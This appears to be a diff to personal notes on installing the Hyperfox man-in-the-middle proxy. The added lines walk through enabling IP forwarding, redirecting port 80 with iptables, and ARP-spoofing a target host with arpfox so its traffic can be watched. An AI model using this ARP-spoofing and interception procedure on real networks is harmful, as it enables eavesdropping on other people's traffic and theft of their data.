@@ -1,5 +1,30 @@
 https://hyperfox.org/
 https://github.com/malfunkt/hyperfox
+https://github.com/malfunkt/arpfox
 https://www.kitploit.com/2017/12/hyperfox-httphttps-mitm-proxy-and.html
 Install
 	go install github.com/malfunkt/hyperfox
+Package binary
+	wget https://github.com/malfunkt/hyperfox/releases/download/v1.9.8/hyperfox_linux_amd64.gz
+	tar xf hyperfox_linux_amd64.gz
+Locate the gateway IP and network interface
+	route
+The interface in our example is called wlan0 and the interface's gateway is 10.0.0.1.
+	export HYPERFOX_GW=10.0.0.1
+	export HYPERFOX_IFACE=wlan0
+Then identify the IP address of the target, let's suppose it is 10.0.0.143.
+	export HYPERFOX_TARGET=10.0.0.143
+Enable IP forwarding on the host for it to act (temporarily) as a common router.
+	sysctl -w net.ipv4.ip_forward=1
+Issue an iptables rule on the host to instruct it to redirect all traffic that goes to port 80 (commonly HTTP) to a local port where Hyperfox is listening to (1080).
+	iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 1080
+We're almost ready, prepare Hyperfox to receive plain HTTP traffic:
+	hyperfox
+Test
+https://github.com/malfunkt/hyperfox/pull/17
+	curl -x http://127.0.0.1:1080 -v -L google.com
+
+Finally, run arpfox to alter the target's ARP table so it starts sending its network traffic to the host box:
+	arpfox -i $HYPERFOX_IFACE -t $HYPERFOX_TARGET $HYPERFOX_GW
+and watch the live traffic coming in.
+
